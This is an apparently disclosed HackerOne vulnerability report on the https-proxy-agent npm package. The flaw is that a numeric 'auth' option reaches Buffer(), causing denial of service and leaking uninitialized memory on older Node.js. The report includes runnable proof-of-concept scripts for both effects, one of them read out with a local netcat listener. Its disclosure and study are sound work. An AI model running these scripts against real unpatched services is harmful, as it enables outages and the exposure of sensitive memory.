---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '319532'
original_report_id: '319532'
title: '`https-proxy-agent` passes unsanitized options to Buffer(arg), resulting in
  DoS and uninitialized memory leak'
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2018-02-25T12:56:44.574Z'
disclosed_at: '2018-04-02T20:49:07.192Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: https-proxy-agent
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# `https-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak

## Metadata

- HackerOne Report ID: 319532
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2018-04-02T20:49:07.192Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a Buffer allocation vulnerability in `https-proxy-agent`.

In setups where `auth` argument is user-controlled, it allows to:
1. cause Denial of Service by trivially consuming all the available CPU resources
2. extract uninitialized memory chunks from the server on Node.js <8.x.

# Module

**module name:** https-proxy-agent
**version:** 2.1.1 
**npm page:** `https://www.npmjs.com/package/https-proxy-agent`

## Module Description

> This module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in https module.

## Module Stats

114 304 downloads in the last day
1 668 955 downloads in the last week
6 758 891 downloads in the last month

~81 106 692 estimated downloads per year

# Vulnerability

## Vulnerability Description

`https-proxy-agent` passes `auth` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).

The exact line: https://github.com/TooTallNate/node-https-proxy-agent/blob/2.1.1/index.js#L207

## Steps To Reproduce:

### DoS
```js
var url = require('url');
var https = require('https');
var HttpsProxyAgent = require('https-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

setInterval(() => {
  proxy.auth = 1e9; // a number as 'auth'
  var opts = url.parse('https://example.com/');
  var agent = new HttpsProxyAgent(proxy);
  opts.agent = agent;
  console.time('tick');
  https.get(opts);
  console.timeEnd('tick');
}, 200);
```

Observe how this is consuming memory and CPU — each request takes >1 second in the main thread on my setup.

### Uninitialized memory leak

```js
// listen with: nc -l -p 8080

var url = require('url');
var https = require('https');
var HttpsProxyAgent = require('https-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

proxy.auth = 500; // a number as 'auth'
var opts = url.parse('https://example.com/');
var agent = new HttpsProxyAgent(proxy);
opts.agent = agent;
https.get(opts);
```

Listen with `nl -l -p 8080` to see requests.

Execute on various Node.js versions — 4.x LTS, 6.x LTS, 8.x LTS / 9.x.

This leaks uninitialized Buffer memory on Node.js <8.x.
On ≥8.x those Buffers (that are using the deprecated API) are zero-filled.

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0
- gnu-netcat 0.7.1

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Denial of service
Sensitive data leak (on Node.js <8.0)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
